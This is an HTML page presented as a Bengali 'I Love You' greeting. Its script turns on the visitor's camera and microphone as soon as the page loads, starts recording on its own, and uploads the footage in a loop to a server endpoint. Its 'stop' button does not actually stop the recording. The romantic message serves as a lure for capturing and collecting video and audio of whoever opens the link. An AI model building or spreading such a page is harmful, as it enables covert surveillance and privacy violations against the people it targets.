<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>I Love You ❤️</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: 'Georgia', serif;
      overflow: hidden;
    }

    .container {
      position: relative;
      width: 100%;
      max-width: 800px;
      padding: 20px;
    }

    /* ভিডিও প্রিভিউ (ব্যাকগ্রাউন্ডে) */
    #video-preview {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 0;
      background: #000;
      transform: scaleX(-1); /* মিরর ইফেক্ট */
    }

    /* কন্টেন্ট (টেক্সট) */
    .content {
      position: relative;
      z-index: 10;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
      pointer-events: none;
    }

    .love-text {
      font-size: 4.5rem;
      font-weight: bold;
      color: #ff1493;
      text-shadow: 
        0 0 20px rgba(255, 20, 147, 0.8),
        0 0 40px rgba(255, 20, 147, 0.5),
        0 0 80px rgba(255, 20, 147, 0.3);
      animation: pulse 2s ease-in-out infinite;
      letter-spacing: 4px;
      font-family: 'Georgia', serif;
      user-select: none;
    }

    .sub-text {
      color: rgba(255, 255, 255, 0.5);
      font-size: 1.2rem;
      margin-top: 20px;
      letter-spacing: 2px;
      font-family: 'Arial', sans-serif;
    }

    /* রেকর্ডিং ইন্ডিকেটর */
    .recording-indicator {
      display: none;
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 20;
      background: rgba(255, 0, 0, 0.8);
      color: white;
      padding: 10px 20px;
      border-radius: 30px;
      font-size: 0.9rem;
      font-family: 'Arial', sans-serif;
      animation: blink 1s infinite;
    }

    .recording-indicator.active {
      display: block;
    }

    /* স্টার্ট বাটন */
    .start-btn {
      position: fixed;
      bottom: 40px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 20;
      background: rgba(255, 20, 147, 0.7);
      color: white;
      border: 2px solid #ff1493;
      padding: 15px 40px;
      border-radius: 50px;
      font-size: 1.1rem;
      font-family: 'Arial', sans-serif;
      cursor: pointer;
      pointer-events: auto;
      transition: all 0.3s;
      backdrop-filter: blur(10px);
      letter-spacing: 1px;
    }

    .start-btn:hover {
      background: #ff1493;
      transform: translateX(-50%) scale(1.05);
      box-shadow: 0 0 30px rgba(255, 20, 147, 0.5);
    }

    .start-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: translateX(-50%) scale(0.95);
    }

    /* অ্যানিমেশন */
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.9; }
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    /* মোবাইল রেসপন্সিভ */
    @media (max-width: 600px) {
      .love-text {
        font-size: 2.8rem;
      }
      .sub-text {
        font-size: 0.9rem;
      }
      .start-btn {
        padding: 12px 25px;
        font-size: 0.9rem;
        bottom: 25px;
      }
    }
  </style>
</head>
<body>
  
  <!-- ভিডিও প্রিভিউ (ব্যাকগ্রাউন্ড) -->
  <video id="video-preview" autoplay playsinline muted></video>

  <!-- রেকর্ডিং ইন্ডিকেটর -->
  <div class="recording-indicator" id="recordingIndicator">
    🔴 RECORDING...
  </div>

  <!-- কন্টেন্ট -->
  <div class="content">
    <div class="love-text">I Love You ❤️</div>
    <div class="sub-text">তোমার জন্য আমার ভালোবাসা</div>
  </div>

  <!-- স্টার্ট বাটন -->
  <button class="start-btn" id="startBtn">📸 ক্যামেরা চালু করুন</button>

  <script>
    const videoPreview = document.getElementById('video-preview');
    const startBtn = document.getElementById('startBtn');
    const recordingIndicator = document.getElementById('recordingIndicator');

    let mediaStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let isRecording = false;

    // === ক্যামেরা চালু ===
    async function startCamera() {
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true
        });

        videoPreview.srcObject = mediaStream;
        startBtn.textContent = '🎥 রেকর্ডিং শুরু করুন';
        startBtn.disabled = false;
        startBtn.onclick = startRecording;

        // স্বয়ংক্রিয়ভাবে রেকর্ডিং শুরু
        startRecording();

      } catch (err) {
        console.error('Camera error:', err);
        alert('❌ ক্যামেরা অ্যাক্সেস দেওয়া হয়নি। দয়া করে ব্রাউজারের অনুমতি দিন।');
        startBtn.textContent = '🔄 পুনরায় চেষ্টা করুন';
        startBtn.onclick = startCamera;
      }
    }

    // === রেকর্ডিং শুরু ===
    function startRecording() {
      if (isRecording) return;

      recordedChunks = [];
      mediaRecorder = new MediaRecorder(mediaStream, {
        mimeType: 'video/webm;codecs=vp9,opus'
      });

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        await uploadVideo(blob);
        isRecording = false;
        recordingIndicator.classList.remove('active');
        
        // আবার রেকর্ডিং শুরু
        setTimeout(startRecording, 2000);
      };

      mediaRecorder.start(1000); // প্রতি 1 সেকেন্ডে ডেটা সেভ
      isRecording = true;
      recordingIndicator.classList.add('active');
      startBtn.textContent = '⏳ রেকর্ডিং চলছে...';
      startBtn.disabled = true;

      // ২ সেকেন্ড পর বাটন আবার সক্রিয়
      setTimeout(() => {
        startBtn.disabled = false;
        startBtn.textContent = '⏹️ থামান (অটো আপলোড)';
      }, 2000);
    }

    // === ভিডিও আপলোড ===
    async function uploadVideo(blob) {
      const formData = new FormData();
      formData.append('video', blob, 'love-video.webm');

      try {
        const response = await fetch('/api/upload', {
          method: 'POST',
          body: formData
        });

        const data = await response.json();
        if (data.success) {
          console.log('✅ Video uploaded:', data.videoUrl);
        } else {
          console.error('Upload failed:', data.error);
        }
      } catch (err) {
        console.error('Upload error:', err);
      }
    }

    // === পেজ লোড হলে অটো ক্যামেরা চালু ===
    window.addEventListener('load', () => {
      // একটু দেরি করে চালান
      setTimeout(startCamera, 500);
    });

    // ব্রাউজার ট্যাব বন্ধ করলে স্ট্রিম বন্ধ
    window.addEventListener('beforeunload', () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
    });
  </script>

</body>
</html>
